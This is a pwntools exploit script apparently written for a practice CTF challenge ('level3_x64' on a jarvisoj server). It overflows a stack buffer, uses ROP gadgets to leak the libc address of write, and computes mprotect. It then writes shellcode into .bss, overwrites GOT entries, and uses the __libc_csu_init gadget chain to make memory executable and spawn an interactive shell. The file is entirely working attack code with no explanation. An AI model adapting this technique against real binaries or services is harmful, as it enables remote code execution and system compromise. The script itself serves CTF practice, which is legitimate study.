from pwn import *
context.binary = './level3_x64'
#conn=process('./level3_x64')
conn=remote("pwn2.jarvisoj.com", "9884")
e=ELF('./level3_x64')
#libc=ELF('/usr/lib64/libc-2.26.so')
libc=ELF('./libc-2.19.so')
pad=0x80
vul_addr=e.symbols["vulnerable_function"]
write_plt=e.symbols['write']
write_got=e.got['write']
read_plt=e.symbols['read']
pop_rdi=0x4006b3 #pop rdi;ret
pop_rsi=0x4006b1 #pop rsi;pop r15;ret
##############################################
#get mprotect_addr
#edx=0x200 is not serious
payload1="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+"deadbuff"+p64(write_plt)+p64(vul_addr)
conn.recv()
sleep(0.2)
conn.send(payload1)
write_addr=u64(conn.recv(8))
pause()
#print write_addr 
libc_write=libc.symbols['write']
libc_mprotect=libc.symbols['mprotect']
mprotect_addr=(libc_mprotect-libc_write)+write_addr
print (hex(mprotect_addr))
#############################################
#write the shellcode to bss
bss_addr=e.bss()
shellcode=asm(shellcraft.sh())
payload2="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload2)
sleep(0.2)
conn.send(shellcode)
#############################################
#write the bss to got_table
pause()
bss_got=0x600a47#any empty got_table address is ok
payload3="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_got)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload3)
sleep(0.2)
conn.send(p64(bss_addr))
#############################################
#write the mprotect to got_table
pause()
mprotect_got=0x600a51#any empty got_table address is ok
payload4="A"*pad+"BBBBBBBB"+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(mprotect_got)+"deadbuff"+p64(read_plt)+p64(vul_addr)
sleep(0.2)
conn.send(payload4)
sleep(0.2)
conn.send(p64(mprotect_addr))
#############################################
pause()
#add rsp,8 
#pop rbx
#pop rbp
#pop r12
#pop r13
#pop r14
#pop r15
#retn
csu_start=0x4006a6
#mov rdx,r13  the 3rd parm
#mov rsi,r14  the 2nd parm  
#mov edi,r15  the 1st parm
#call [r12] 
#add rbx,1
#cmp rbx,rbp
#jnz short loc_400690
csu_end=0x400690
payload5="A"*pad+"BBBBBBBB"+p64(csu_start)
#try to call mprotect
payload5+='a'*8+p64(0)+p64(1)+p64(mprotect_got)+p64(7)+p64(0x1000)+p64(0x600000)
payload5+=p64(csu_end)
#try to call shellcode
payload5+='a'*8+p64(0)+p64(1)+p64(bss_got)+p64(0)+p64(0)+p64(0)
payload5+=p64(csu_end)
sleep(0.2)
conn.send(payload5)
conn.interactive()
